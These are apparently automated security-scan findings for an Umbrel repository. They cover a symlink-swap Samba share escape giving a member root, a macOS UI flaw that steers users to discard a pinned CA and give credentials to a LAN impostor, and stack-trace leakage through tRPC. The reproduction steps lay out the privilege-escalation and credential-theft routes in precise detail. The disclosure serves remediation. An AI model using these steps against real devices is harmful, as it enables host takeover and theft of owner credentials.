# Member Samba share root re-resolved by smbd as root after validation; symlink swap grants host root

## Details
umbrelOS lets a member account export directories of its own home (`/Users/<slug>/...`) over Samba (`files.addShare`). Samba.#applyShares validates the share path once (realpath containment via virtualToSystemPath, then pathExists) and writes the *unresolved* system path into `/etc/samba/smb.conf` together with `force user = root` and `writeable = yes` (samba.ts:485-503, 73-93). smbd does not reuse umbreld's check: the kernel resolves every symlink component of `path =` when smbd chdir()s/realpath()s the share root at tree connect (Samba `make_connection_snum` -> `canonicalize_connect_path`), and `wide links = no` only confines symlinks *under* that canonical root. The only post-apply revocation is `#handleFileChange` (samba.ts:584-592), which removes a share only on a watcher `delete` event whose path equals or is an ancestor of the stored share path string; AppDirectoryMonitor polls only `/Apps/` paths.

A member can therefore make a stored share path resolve outside their home after validation, deterministically and using only member-capable Files routes. Member home is `<data>/members/<slug>/home` = `/home/umbrel/umbrel/members/<slug>/home` (six components deep):
1. Upload an archive and `files.unarchive` it (unar materialises symlink entries) so that `/Users/<slug>/A/` contains `link -> real` (relative symlink), a real directory `real/etc/`, and a relative symlink seven directories down, `d1/d2/d3/d4/d5/d6/d7/real -> ../../../../../../..` (seven `..`). At that depth the latter resolves to `<home>/A`, inside the base.
2. `files.addShare('/Users/<slug>/A/link/etc')`: getAllowedOperations lstat follows the intermediate symlink and sees a directory; virtualToSystemPath realpaths to `<home>/A/real/etc` (inside); smb.conf now contains `[etc (Umbrel) (User <slug>)] path = <home>/A/link/etc`, `force user = root`.
3. `files.rename('/Users/<slug>/A/real', 'real2')`. The watcher delete is for `/Users/<slug>/A/real`, which neither equals nor is an ancestor of `/Users/<slug>/A/link/etc`; the share stays. `link` is now dangling.
4. `files.move('/Users/<slug>/A/d1/d2/d3/d4/d5/d6/d7/real', '/Users/<slug>/A')`: virtualToSystemPath on the source realpaths it to `<home>/A` (inside), fse.stat through it succeeds, `<home>/A/real` is a missing tail so authorizeDestinationSystemPath approves it, and fs-extra move rename(2)s the symlink to `<home>/A/real`. From `<home>/A/` seven `..` is `/`. The watcher sees a delete for `.../d7/real` (matches no share) and a create for `A/real` (not a delete). The share record is untouched and smb.conf is not rewritten.
5. The member's SMB client tree-connects to `etc (Umbrel) (User <slug>)`. smbd resolves `<home>/A/link/etc` -> `link -> real -> ../../../../../../..` -> `/etc` and serves it read/write as root. Naming the directory `home` instead yields `/home` (the whole umbreld data directory: umbrel.yaml with the owner password hash and NAS credentials, secrets/, app compose files, custom-hooks/pre-start which runs as root at boot).

No race is required: the share path string is never deleted, so no revocation fires until some unrelated applyShares run (another share add/remove, external storage change, restart) re-validates and drops the export, and even then the member can restore `real`, re-trigger applyShares and repeat. A second, race-based variant exists for a plain shared directory (rename it away and move the escaping symlink into its place): the share is removed only after the asynchronous watcher -> removeSharesWithin -> applyShares -> `smbcontrol reload-config` chain, and removeShare deliberately never `close-share`s (samba.ts:674-676), so a tree connect that lands first persists for the session.

This is distinct from files-mutation-path-toctou-symlink-swap (Files' own syscalls racing a parent swap) and member-share-apps-directory-compose-root-escalation (owner-granted app folders): the sink here is smbd re-resolving umbreld's stale `path =` as root. The project's own integration test 'throws on symlink traversal attempt' (samba.integration.test.ts:249) shows share-root escape via symlinks is a surface the project intends to defend; the defence is only evaluated at add/apply time.

Assumptions (dependencies not installed): Debian trixie Samba as installed by packages/os/umbrelos.Dockerfile:421 resolves the configured `path` through the kernel at tree connect (`canonicalize_connect_path`) and has no option refusing symlinked components; Debian `unar` (same Dockerfile line) extracts symlink entries as symlinks, consistent with the project's comment at api.ts:333; fs-extra ^11.1.1 `move()` lstat-checks both paths, tests the destination with pathExists/access and uses rename(2) on the same device; Watchman (pinned in the Dockerfile, backend forced at watcher.ts:158) reports a path that still exists after a rename as create/update, never as delete.

## Evidence
1. [packages/umbreld/source/modules/files/samba.ts:485–502](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/packages/umbreld/source/modules/files/samba.ts#L485-L502)
   #applyShares validates each share once (virtualToSystemPath realpath containment, then pathExists) and writes the *unresolved* system path returned by virtualToSystemPath into smb.conf. Nothing pins the validated directory (no bind mount, no realpath written, no dev/ino identity) and nothing re-checks until the next applyShares; smbd resolves the pathname itself at every tree connect.
2. [packages/umbreld/source/modules/files/samba.ts:73–92](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/packages/umbreld/source/modules/files/samba.ts#L73-L92)
   Every share, including a member's own-home share, is rendered with `writeable = yes` and `force user = root`, so whatever directory the kernel resolves `path =` to is served read/write as root to the member's Samba login.
3. [packages/umbreld/source/modules/files/samba.ts:584–591](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/packages/umbreld/source/modules/files/samba.ts#L584-L591)
   The only post-apply revocation is this watcher hook, which acts solely on a `delete` event whose virtual path equals or is an ancestor of the stored share path string. Renaming or replacing a *sibling* that a symlink component of the share path points at produces no such event, so the stale `path =` stays live indefinitely.
4. [packages/umbreld/source/modules/files/samba.ts:612–657](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/packages/umbreld/source/modules/files/samba.ts#L612-L657)
   addShare authorizes with getAllowedOperations (lstat; intermediate symlinks are followed, final component must be a directory) and virtualToSystemPath (realpath containment at this instant), so `/Users/<slug>/A/link/etc` with `A/link -> real` and a real `A/real/etc` passes and is persisted verbatim.
5. [packages/umbreld/source/modules/files/files.ts:2199–2231](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/packages/umbreld/source/modules/files/files.ts#L2199-L2231)
   virtualToSystemPath checks realpath containment of the path *as it currently resolves* and deliberately returns the as-passed pathname (lines 2229-2231). A relative symlink `../../../../../../..` seven directories below the member home resolves to the home itself and is accepted; the same link relocated one level below the home resolves to `/`.
6. [packages/umbreld/source/modules/files/files.ts:1157–1236](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/packages/umbreld/source/modules/files/files.ts#L1157-L1236)
   move() (member-capable, routes.ts:227) authorizes the source symlink where it currently sits, stats through it, authorizes the destination as a missing tail, then rename(2)s it (fs-extra move) into a shallower directory. The move itself is what changes the directory the relative target is resolved from; nothing re-validates after the rename.
7. [packages/umbreld/source/modules/files/files.ts:1253–1285](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/packages/umbreld/source/modules/files/files.ts#L1253-L1285)
   rename() (member-capable) lets the member rename `A/real` -> `A/real2`, vacating the name the share path's symlink points at; the watcher delete event is for `/Users/<slug>/A/real`, which is neither the share path nor its ancestor.
8. [packages/umbreld/source/modules/files/files.ts:758–769](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/packages/umbreld/source/modules/files/files.ts#L758-L769)
   removeReferencesWithin, run after move/rename, revokes Samba shares only for /Apps paths; member-home shares rely entirely on the watcher delete hook.
9. [packages/umbreld/source/modules/files/archive.ts:195–223](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/packages/umbreld/source/modules/files/archive.ts#L195-L223)
   unarchive() (member-capable, routes.ts:323) runs `unar` as root into the member's home with no symlink sanitisation (api.ts:333 acknowledges 'Archive extraction can create symlinks'); this is how a shell-less member materialises `link -> real` and the deep relative `../../../../../../..` symlink.
10. [packages/umbreld/source/modules/files/files.ts:1833–1836](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/packages/umbreld/source/modules/files/files.ts#L1833-L1836)
   'share' is granted when lstat of the unresolved system path is a directory; lstat follows intermediate symlinks, so `/Users/<slug>/A/link/etc` is shareable while `link` still points inside the home.
11. [packages/umbreld/source/modules/files/routes.ts:402–404](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/packages/umbreld/source/modules/files/routes.ts#L402-L404)
   files.addShare is privateProcedureWithMembers (= accountProcedure, trpc.ts:35): a member creates the share themselves once the owner has enabled Samba access for their account (setMemberSambaAccess, routes.ts:415).

## Impact
The member obtains a persistent SMB session whose root is an arbitrary host directory served as root with write access: read umbrel.yaml (owner password hash, NAS credentials), secrets/ (sessions, system token), all accounts' files and app data; write custom-hooks/pre-start, app compose files, /etc/sudoers.d or systemd units for root code execution; delete anything. Full compromise of the device.

## Reproduction steps
1. Attacker is an authenticated member reaching the dashboard and Samba over LAN/Tailscale, for whom the owner has enabled Samba access (setMemberSambaAccess; an attack requirement, and the sanctioned way members get SMB logins to their own home). Using only member-capable Files routes (upload, unarchive, addShare, rename, move) they plant two symlinks via archive extraction, register a share through the intermediate symlink, then rename the symlink's target away and move a deep relative `..` symlink into its place; every check passes because each path is validated where it sits at that moment, and no watcher delete ever touches the share path string. The route is deterministic (no race) and repeatable; a race-based fallback also exists. No owner interaction during the attack.

## Recommended fix
1. Samba.#applyShares proves containment of a member share path once, then hands smbd an unresolved pathname that the kernel re-resolves through member-controlled symlink components at every tree connect; no mechanism pins the validated directory or revalidates when what the path resolves to changes. Fix criteria: The directory smbd serves for a member share must be the directory umbreld authorised, regardless of later filesystem changes under the member's control: e.g. export a umbreld-controlled bind mount of the validated realpath, or write the realpath and re-verify it (O_NOFOLLOW/openat walk, dev/ino pinning) on every reload and on any change event anywhere under the member's root, closing the share and disconnecting the account when revalidation fails. Verify by repeating steps 1-5 and confirming the tree connect is refused or still lands in <home>/A/real/etc.
2. Member shares run with `force user = root`, so any share-root escape yields root-level filesystem access instead of the member's own privileges. Fix criteria: Member shares should not be served as root: force the share to the member's managed Unix user (or a per-member uid owning the member home) so that even a mis-resolved path only grants that user's permissions. Verify that files outside the member home that are not world-readable are inaccessible through a member share whose path has been redirected.
3. Share revocation for member-home paths relies on watcher `delete` events that string-match the stored virtual share path or an ancestor; changes that alter what a symlink component resolves to (renaming its target, moving a relative symlink to a different depth) touch only sibling paths and emit no matching event, and removeReferencesWithin only revokes Samba shares under /Apps. Fix criteria: Revocation must be keyed on the resolved identity of the shared directory, not on the share path string: on any Files mutation or watcher event under a member's root (and on a periodic schedule), re-resolve every stored share and compare dev/ino against the pinned authorised directory, removing and close-share-ing the export on mismatch before the change becomes visible to smbd. Verify that after steps 3-4 the share is removed (or still resolves to the original directory) before any tree connect can reach `/`.

---
**Severity:** HIGH
**Status:** Open
**Category:** Race condition
**CWE:** [CWE-367](https://cwe.mitre.org/data/definitions/367.html)
**Attack vector:** NETWORK
**Attack complexity:** LOW
**Attack requirements:** PRESENT
**Privileges required:** LOW
**User interaction:** NONE
**Vulnerable system confidentiality impact:** HIGH
**Vulnerable system integrity impact:** HIGH
**Vulnerable system availability impact:** HIGH
**Subsequent system confidentiality impact:** NONE
**Subsequent system integrity impact:** NONE
**Subsequent system availability impact:** NONE
**Repository:** Halbarevi/umbrel
**Branch:** main
**Commit:** fae798071e87c53dd2833af649dcaf4d60b84500
**Date created:** 2026-10-18
**Finding URL:** https://claude.ai/security?project=scanproj_013wzGGrZsCxqDCQQkNFbs53&finding=scan_01Uc5wvZcjbRhyvc4aq51Gy8-5258397

---

# macOS app renders pinned-CA rejection as "Device is offline" and offers unconfirmed Forget that discards the pin

## Details
UmbrelKit pins one device-local CA per saved Umbrel; LocalHTTPSSessionDelegate rejects any peer whose chain does not anchor to that pin, so a LAN impostor answering for the saved `umbrel.local`/IPs cannot receive native credentials. The macOS menu-bar app then presents that rejection as the Umbrel being offline and offers an unconfirmed "Forget Device" whose effect is to discard the pin.

Trace (impostor answers for every saved LAN endpoint with its own CA, no verifying Tailscale route):
1. Liveness: `probeSweep` -> `firstReachableEndpoint` (AppState.swift:556-563) wraps `Umbreld.resolvedHost`/`identify` in `try?`; the pinned verification fails on every host and `probeCompleted` records host=nil. `rebuild()` (228-246) renders the saved device with `reachability: .offline`; `DeviceReachability` has no trust state. The list shows "Offline" (Components.swift:171-173), the detail view shows "Device is offline" (DeviceDetailView.swift:100-112), and the tray switches to the alert icon (AppState.swift:591-597). Bonjour identification of the impostor with the saved id also fails against the pin (`identifyCandidate` hinted path), so nothing else is shown.
2. Recovery offered: if connected, the footer offers "Disconnect" and "Forget Device" (414-442). After disconnect, or if already signed out, the main content offers "Connect", which runs `loadAccounts` (472-499): `prepareToSignIn` -> `prepareSavedDeviceForSignIn` returns `.alreadyEnrolled` (pin intact), then `listAccounts(target:)` fails and the catch-all shows "Couldn't load accounts." with "Try again"; the footer still shows "Forget Device". No macOS code consumes `Umbreld.Error.Kind.trust`, `isConnectivityFailure` is used only in `shareHome`, and `LocalHTTPSTransportError.identityChanged`'s text ("Remove it and add it again") is never displayed.
3. `forget()` (452-466) runs with no confirmation; its comment calls forgetting "cheap to undo ... one password restores it". `AppState.forget` (697-705) calls `forgetLocalHTTPSIdentity` and removes the saved record.
4. The list is now empty with the primary "Scan network" button; `rescan()` restarts the browse and `discoveryUpdated` (345-366) identifies candidates with `knownDeviceIds` no longer containing the id, i.e. first-use mode: the impostor is verified against its own CA and shown as the WelcomeCard "Your device is ready to connect" (DeviceListView.swift:56-59, 277-299) carrying the genuine model string. Clicking Connect opens DeviceDetailView whose `.task` (59-62) immediately runs `prepareToSignIn` -> `claimLocalHTTPSIdentity` (748-764), pinning the impostor's CA under the device id; the password form then posts password and TOTP via `connect` -> `Umbreld.login(target:)` to the impostor. "Connect by address" (`connectByAddress`, 468-504) reaches the same first-use path.

Inside UmbrelKit the signal is also fragile: `verifyEndpoint` (Umbreld.swift:1549-1575) maps `URLError.cancelled` to `.unavailable`, and the delegate uses `.cancelAuthenticationChallenge` recording nothing, so a pin mismatch is assumed (Foundation behaviour) to already arrive as `.connectivity`.

Result: the pin fires correctly, but the macOS presentation converts it into persistent "Offline" messaging whose only on-screen repair is Forget (no confirmation) -> Scan -> Connect, which re-establishes TOFU with the impostor and delivers the owner's password and TOTP, replacing the genuine pin. Related, not twin, to the verified iOS record saved-device-pin-mismatch-rendered-as-offline-steers-repair (iOS SignInSheet/MainModel); this record covers the macOS AppState/DeviceDetailView path, which additionally lacks any removal confirmation and auto-claims the new identity on card open. Distinct from first-use-pairing-impostor-pin-id-collision (pin absent there; present and discarded here).

## Evidence
1. [clients/apple/macos/Sources/Umbrel/AppState.swift:556–579](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/clients/apple/macos/Sources/Umbrel/AppState.swift#L556-L579)
   Primary location. firstReachableEndpoint wraps Umbreld.resolvedHost in try? and identify(host:expectedDeviceId:) is try? internally, so the Umbreld.Error (kind .trust, or .connectivity after the kit's URLError.cancelled mapping) raised when every saved host fails the Keychain CA pin becomes nil; probeCompleted then stores host=nil/identity=nil. The health loop (1419) skips offline devices, so nothing else inspects the failure. A pin rejection must survive here as a distinct state for the UI to render it.
2. [clients/apple/macos/Sources/Umbrel/AppState.swift:228–246](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/clients/apple/macos/Sources/Umbrel/AppState.swift#L228-L246)
   rebuild() renders any saved device without a successful pinned probe as reachability .offline; DeviceReachability (Models.swift:31-35) has only unverified/online/offline, so a pin rejection and a powered-off device are the same state.
3. [clients/apple/macos/Sources/Umbrel/Views/DeviceDetailView.swift:100–112](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/clients/apple/macos/Sources/Umbrel/Views/DeviceDetailView.swift#L100-L112)
   A saved device whose pinned identity probes were rejected is rendered as "Device is offline"; when not authenticated a "Connect" button leads to loadAccounts, which fails with the same generic text.
4. [clients/apple/macos/Sources/Umbrel/Views/DeviceDetailView.swift:452–466](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/clients/apple/macos/Sources/Umbrel/Views/DeviceDetailView.swift#L452-L466)
   forget() runs with no confirmation dialog; the comment frames forgetting as "cheap to undo ... one password restores it" - the user is never told a security identity is being discarded or that an identity check just failed.
5. [clients/apple/macos/Sources/Umbrel/Views/DeviceDetailView.swift:414–442](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/clients/apple/macos/Sources/Umbrel/Views/DeviceDetailView.swift#L414-L442)
   In the offline/error state the footer always offers "Forget Device" (and "Disconnect" if still connected) as the only other action for a saved device.
6. [clients/apple/macos/Sources/Umbrel/Views/DeviceDetailView.swift:472–499](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/clients/apple/macos/Sources/Umbrel/Views/DeviceDetailView.swift#L472-L499)
   loadAccounts catches every error from prepareToSignIn/listAccounts(target:) - including the trust- or connectivity-classified pin rejection from resolvedHost - and renders the single string "Couldn't load accounts."; the error kind is discarded and only "Try again" is offered beside it.
7. [clients/apple/macos/Sources/Umbrel/AppState.swift:697–705](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/clients/apple/macos/Sources/Umbrel/AppState.swift#L697-L705)
   AppState.forget calls Umbreld.forgetLocalHTTPSIdentity (deletes the Keychain CA pin via LocalHTTPSTransport.forget), removes the id from explicitlyClaimedDeviceIds and removes the saved record, so the device can only be re-added through first-use (TOFU) pairing.
8. [clients/apple/macos/Sources/Umbrel/Views/Components.swift:161–184](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/clients/apple/macos/Sources/Umbrel/Views/Components.swift#L161-L184)
   statusInfo labels a saved, not-online device "Offline" (red) in the list, welcome card and detail header; no label exists for an identity mismatch.
9. [clients/apple/macos/Sources/Umbrel/AppState.swift:591–597](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/clients/apple/macos/Sources/Umbrel/AppState.swift#L591-L597)
   showsAlertIcon switches the tray to the alert icon while no saved device is connected, prompting the user to open the popup and troubleshoot the "offline" device.
10. [clients/apple/macos/Sources/Umbrel/AppState.swift:345–366](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/clients/apple/macos/Sources/Umbrel/AppState.swift#L345-L366)
   discoveryUpdated identifies Bonjour candidates with knownDeviceIds = saved ids ∪ explicitlyClaimedDeviceIds. After forget the id is no longer known, so the impostor advertising for umbrel.local is identified in first-use mode (plain-HTTP system.localHttpsIdentity bootstrap, then HTTPS against its own CA) and appears as an unsaved "Ready to connect" device; rescan() (451-463) restarts the browse so it is re-enumerated immediately.
11. [clients/apple/macos/Sources/Umbrel/Views/DeviceDetailView.swift:59–62](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/clients/apple/macos/Sources/Umbrel/Views/DeviceDetailView.swift#L59-L62)
   Opening the (now unsaved, online) card auto-runs loadAccounts -> prepareToSignIn without a further click.
12. [clients/apple/macos/Sources/Umbrel/AppState.swift:748–764](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/clients/apple/macos/Sources/Umbrel/AppState.swift#L748-L764)
   prepareToSignIn: for a still-saved device prepareSavedDeviceForSignIn returns .alreadyEnrolled and leaves the pin intact (so the correct rejection persists); for the unsaved post-forget card it calls claimLocalHTTPSIdentity, enrolling the impostor's CA under the device id (LocalHTTPSTransport.enroll replacingExisting: true), after which the password form posts the owner password and TOTP (connect(), 603-626) to the impostor.
13. [clients/apple/macos/Sources/Umbrel/Views/DeviceListView.swift:56–59](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/clients/apple/macos/Sources/Umbrel/Views/DeviceListView.swift#L56-L59)
   After forget the impostor is the single unsaved device (singleUnsaved, 13-15), so it is shown as the prominent WelcomeCard ("Your device is ready to connect", "Connect" button, 277-305) with the model string the impostor reports.
14. [clients/apple/UmbrelKit/Sources/UmbrelKit/Umbreld.swift:450–452](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/clients/apple/UmbrelKit/Sources/UmbrelKit/Umbreld.swift#L450-L452)
   The project's stated guarantee for saved devices: "a LAN peer can't claim a known discovery id and move the app's trust anchor". This finding is the path by which a LAN peer nonetheless moves it - through the UI's misrepresentation and unconfirmed removal rather than through the pin check itself.
15. [clients/apple/UmbrelKit/Sources/UmbrelKit/Umbreld.swift:1549–1575](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/clients/apple/UmbrelKit/Sources/UmbrelKit/Umbreld.swift#L1549-L1575)
   verifyEndpoint maps URLError.cancelled to .unavailable (connectivity). Assumption (Foundation, macOS 14+ SDK): a server-trust challenge answered with .cancelAuthenticationChallenge fails the task with URLError.cancelled, so the kit itself reports a pin mismatch as "Could not reach this Umbrel"; the macOS UI drops the distinction in either case.
16. [clients/apple/UmbrelKit/Sources/UmbrelKit/LocalHTTPS.swift:257–275](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/clients/apple/UmbrelKit/Sources/UmbrelKit/LocalHTTPS.swift#L257-L275)
   LocalHTTPSSessionDelegate cancels the challenge for a chain that fails SecTrustEvaluateWithError against the pinned anchor and records nothing, so there is no explicit pin-rejected signal for callers.
17. [clients/apple/UmbrelKit/Sources/UmbrelKit/Umbreld.swift:1036–1040](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/clients/apple/UmbrelKit/Sources/UmbrelKit/Umbreld.swift#L1036-L1040)
   The kit documents removal as "the explicit operation that discards first-use trust"; the design depends on removal being an informed decision, which the macOS UI (no confirmation, no trust state) does not make possible.

## Impact
Once the user re-pairs, the owner's password and live TOTP code are posted to the impostor over a channel pinned to its CA (C:H), and claimLocalHTTPSIdentity replaces the genuine pin for this device id so the impostor becomes the app's trusted endpoint for later traffic, including SMB mount credentials fetched after login (I:H). Until then the client treats its genuine, still-pinned Umbrel as unreachable while the impostor answers (A:L). Subsequent-system impact: The captured password and live TOTP code relayed to the genuine umbrelOS device through the public user.loginNative procedure yield an owner native session: full control of the device's files, apps and settings.

## Reproduction steps
1. Attacker on the victim's LAN answers for every saved LAN endpoint of a pinned Umbrel (mDNS for the .local name plus ARP spoofing of the saved IPs, or occupying them while the genuine device is down; no reachable Tailscale route) with an HTTPS server using its own CA and advertising _umbrel._tcp. Pinned probes fail and the Mac app shows the alert tray icon and "Device is offline" / "Couldn't load accounts.". Following the only guidance shown, the victim clicks Forget Device (no confirmation), Scan network, Connect, and enters password and TOTP into first-use pairing against the impostor. Positional/race precondition (AT:P); several deliberate victim clicks (UI:A); no credentials or defenses to bypass (PR:N, AC:L).

## Recommended fix
1. AppState.firstReachableEndpoint/probeCompleted and rebuild() collapse a pinned-identity rejection into DeviceReachability.offline, and DeviceDetailView.loadAccounts collapses every error into "Couldn't load accounts.", so a certificate-pin rejection is indistinguishable from a powered-off device in the list, detail view and tray icon. Fix criteria: A pin or identity-check failure for a saved device is carried as a distinct state through the AppState snapshot and rendered as a security warning (not "Offline"/"Couldn't load accounts.") in the device list, detail view and tray state, and is not retried into or cached as an ordinary offline state. Verify by pointing the saved hostname at a host with a different CA: the Mac app shows an identity-changed warning rather than offline messaging.
2. "Forget Device" runs with no confirmation and is the only recovery action offered beside the misreported failure; it deletes the CA pin and routes the user into first-use pairing where trust is self-asserted by whoever answers, and DeviceDetailView.task auto-claims that identity on card open. Fix criteria: Forgetting a device requires an explicit confirmation that states the device's security identity will be discarded; when an identity check has failed, forget/re-pair is not presented as the remedy, and re-trusting a changed identity requires out-of-band confirmation (e.g. the CA fingerprint shown in the umbrelOS dashboard via lanIngress.getCertificateStatus) before any credential is sent. Verify that after a pin mismatch the user cannot complete sign-in to the new identity without that confirmation.
3. LocalHTTPSSessionDelegate rejects a non-anchored chain with .cancelAuthenticationChallenge and records nothing, while verifyEndpoint classifies URLError.cancelled as .unavailable, so UmbrelKit itself may deliver a pin mismatch as a connectivity failure (shared root cause with the iOS record). Fix criteria: A server-trust rejection by the pinned delegate is reported by UmbrelKit as a trust rejection (never .unavailable/.connectivity); a unit test drives a pinned request against a mismatching chain and asserts the trust classification.

---
**Severity:** HIGH
**Status:** Open
**Category:** UI misrepresentation
**CWE:** [CWE-451](https://cwe.mitre.org/data/definitions/451.html)
**Attack vector:** ADJACENT
**Attack complexity:** LOW
**Attack requirements:** PRESENT
**Privileges required:** NONE
**User interaction:** ACTIVE
**Vulnerable system confidentiality impact:** HIGH
**Vulnerable system integrity impact:** HIGH
**Vulnerable system availability impact:** LOW
**Subsequent system confidentiality impact:** HIGH
**Subsequent system integrity impact:** HIGH
**Subsequent system availability impact:** HIGH
**Repository:** Halbarevi/umbrel
**Branch:** main
**Commit:** fae798071e87c53dd2833af649dcaf4d60b84500
**Date created:** 2026-10-18
**Finding URL:** https://claude.ai/security?project=scanproj_013wzGGrZsCxqDCQQkNFbs53&finding=scan_01Uc5wvZcjbRhyvc4aq51Gy8-5258343

---

# tRPC error formatter forwards server stack traces (and raw internal error messages) to unauthenticated clients because NODE_ENV is never set to production

## Details
umbreld builds its tRPC instance with `initTRPC.context<Context>().create({errorFormatter(...)})` and the formatter returns `{...shape, data: {...shape.data, zodError}}` (trpc.ts:13-26). No `isDev` option is passed and nothing in `shape` is removed. In @trpc/server 11.18.0 (package-lock.json pins 11.18.0; node_modules is not in the checkout, so this is stated as an assumption about that version's documented public contract) the runtime config's `isDev` defaults to `process.env.NODE_ENV !== 'production'`, the default error shape sets `data.stack = error.stack` whenever `isDev` is true, and non-TRPCError throwables are wrapped by `getTRPCErrorFromUnknown` as INTERNAL_SERVER_ERROR inheriting the original `message` and `stack`. The wrapped `message` is forwarded regardless of NODE_ENV; the `stack` is forwarded because NODE_ENV is never 'production'.

Nothing in the shipped system sets NODE_ENV: `umbrel.service` has no `Environment=` line (runs `umbreld --data-directory=...`), the `umbreld` launcher shim only prepends node_modules/.bin to PATH and execs the package.json `start` script (`./source/cli.ts`), the umbrelOS Dockerfile's install block (`COPY packages/umbreld /opt/umbreld`, `npm clean-install --omit dev`) declares no `ENV NODE_ENV`, and `cli.ts`/`index.ts` only read NODE_ENV (treating 'development' as dev mode; `NODE_ENV=development` is set only by the dev-container `watch` script). Production devices therefore run umbreld in tRPC's development mode and every tRPC error response carries `error.data.stack`.

Reachability: `/trpc` is mounted on the loopback umbreld server (server/index.ts:216-219, HTTP and WebSocket) and lan-ingress proxies the public dashboard ports 80/443 to it for any network peer (lan-ingress.ts:1062, `target: http://127.0.0.1:${upstreamPort}`) with no authentication before umbreld's own middleware. An unauthenticated client calling any owner- or member-tier procedure (e.g. `GET /trpc/user.get` with no Authorization header) receives the UNAUTHORIZED TRPCError constructed in is-authenticated.ts:19 together with its stack: absolute paths under `/opt/umbreld/source/modules/...` and `/opt/umbreld/node_modules/@trpc/server/...` with line:column numbers, exposing the exact code revision and the internal call path. Public procedures that let internal failures escape leak runtime diagnostics as well: `hardware.raid.checkInitialRaidSetupStatus` (publicProcedure) rethrows the stored first-boot Error from `user.register`/config-store writes (raid.ts:1178) and its `getStatus()` call can surface execa/fs errors; `system.discoveryInfo`, `user.login` (non-SessionIssuanceInvalidatedError failures from `createSession` are rethrown raw) and similar paths forward fs/execa/store error messages (host paths, command lines and stderr) and stacks. Member sessions receive the same for every files/photos/apps procedure that throws a raw Error (ENOENT etc. with real `/home/umbrel/umbrel/...` paths), and the same formatter serves the authenticated WebSocket transport.

The project's own Express-level error handler (server/error-handler.ts:14) deliberately answers `{error: true}` and the app gateway returns generic bodies, so the tRPC path is the one place internal diagnostics escape to the network. Impact is limited to information disclosure (filesystem layout, dependency internals, exact revision, internal error text) that aids reconnaissance; it does not by itself expose credentials or user data.

## Evidence
1. [packages/umbreld/source/modules/server/trpc/trpc.ts:13–26](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/packages/umbreld/source/modules/server/trpc/trpc.ts#L13-L26)
   initTRPC.create() is called without an isDev override and the custom errorFormatter spreads the default `shape` and `shape.data` verbatim, adding only zodError. Whatever @trpc/server 11.18.0 puts into the shape — `data.stack` when isDev (default NODE_ENV !== 'production') and the inherited `message` of wrapped internal errors — is sent to the client unchanged. This is the code the fix must change.
2. [packages/os/overlay/etc/systemd/system/umbrel.service:6–9](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/packages/os/overlay/etc/systemd/system/umbrel.service#L6-L9)
   The production unit runs `umbreld --data-directory=/home/umbrel/umbrel` with no Environment= line, so process.env.NODE_ENV is undefined on every shipped device.
3. [packages/umbreld/umbreld:15–29](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/packages/umbreld/umbreld#L15-L29)
   The launcher shim only prepends node_modules/.bin to PATH and execs the package.json start script (`./source/cli.ts`); it sets no NODE_ENV. The dev-container branch (/umbrel-dev) is the only path that reaches the `NODE_ENV=development` watch script.
4. [packages/os/umbrelos.Dockerfile:581–586](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/packages/os/umbrelos.Dockerfile#L581-L586)
   The image build installs umbreld at /opt/umbreld with `npm clean-install --omit dev` and declares no `ENV NODE_ENV`; the install path that appears in every forwarded stack frame is fixed here.
5. [packages/umbreld/source/modules/server/trpc/is-authenticated.ts:12–21](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/packages/umbreld/source/modules/server/trpc/is-authenticated.ts#L12-L21)
   Every unauthenticated HTTP call to an owner/member procedure throws the UNAUTHORIZED TRPCError constructed here; its stack (frames under /opt/umbreld/source/... and /opt/umbreld/node_modules/@trpc/server/...) is what the error shape returns to the anonymous caller.
